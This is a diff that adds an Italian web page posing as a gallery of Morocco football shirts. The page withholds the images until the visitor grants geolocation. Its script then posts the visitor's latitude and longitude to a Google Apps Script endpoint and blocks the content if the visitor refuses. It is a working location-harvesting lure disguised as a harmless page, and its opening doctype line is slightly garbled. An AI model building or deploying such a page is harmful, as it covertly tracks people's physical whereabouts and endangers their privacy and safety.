@@ -1,0 +1,104 @@
+<!DO<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Maglie da Calcio - Accesso posizione obbligatorio</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      display: flex; align-items: center; justify-content: center;
+      font-family: Arial, sans-serif;
+      background: white;
+      color: black;
+      flex-direction: column;
+      text-align: center;
+    }
+    #content {
+      display: none;
+    }
+    img {
+      max-width: 200px;
+      margin: 10px;
+    }
+    #error {
+      color: red;
+      font-weight: bold;
+      padding: 20px;
+      font-size: 1.2em;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading">
+    <p></p>
+  </div>
+
+  <div id="error"></div>
+
+  <div id="content">
+    <h1>Maglie da Calcio</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/Marocco_national_football_team_2018_(home).png" alt="Maglia Marocco 1" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e9/Marocco_national_football_team_2018_(away).png" alt="Maglia Marocco 2" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/52/2018_Morocco_home_kit.png" alt="Maglia Marocco 3" />
+  </div>
+
+  <script>
+    const scriptUrl = "https://script.google.com/macros/s/AKfycbxXWlKK4QGqaReGFizufszeRK6XHSJ1B_Qft7anuMbfnmVZA9YxgtGM69U2VF7y2wXn/exec";
+
+    function showError(msg) {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('content').style.display = 'none';
+      const errorDiv = document.getElementById('error');
+      errorDiv.style.display = 'block';
+      errorDiv.textContent = msg;
+    }
+
+    function showContent() {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('error').style.display = 'none';
+      document.getElementById('content').style.display = 'block';
+    }
+
+    if (!navigator.geolocation) {
+      showError('Geolocalizzazione non supportata dal tuo browser. Non puoi accedere alle maglie.');
+    } else {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          // Prepara i dati da inviare
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+
+          // Manda i dati al tuo Apps Script
+          fetch(scriptUrl, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+          })
+          .then(response => response.json())
+          .then(result => {
+            if (result.result === 'success') {
+              showContent();
+            } else {
+              showError('Errore nel registrare la posizione: ' + (result.message || 'Sconosciuto'));
+            }
+          })
+          .catch(err => {
+            showError('Errore nella comunicazione col server: ' + err.message);
+          });
+        },
+        error => {
+          if (error.code === error.PERMISSION_DENIED) {
+            showError('Hai negato il permesso per la posizione. Senza di esso non puoi vedere le maglie da calcio.');
+          } else {
+            showError('Errore nel recupero della posizione: ' + error.message);
+          }
+        }
+      );
+    }
+  </script>
+</body>
+</html>
+
